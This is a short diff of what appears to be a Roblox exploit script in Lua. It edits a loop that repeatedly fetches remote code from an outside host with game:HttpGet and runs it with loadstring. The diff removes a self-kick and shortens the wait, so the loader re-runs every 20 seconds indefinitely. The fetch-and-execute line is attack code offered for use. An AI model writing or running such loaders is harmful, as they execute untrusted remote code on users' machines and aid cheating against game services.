@@ -20,6 +20,5 @@ repeat wait()
 spawn(function()
 loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()
 end)
-wait(60)
-game.Players.LocalPlayer:Kick()
+wait(20)
 until Joebiden
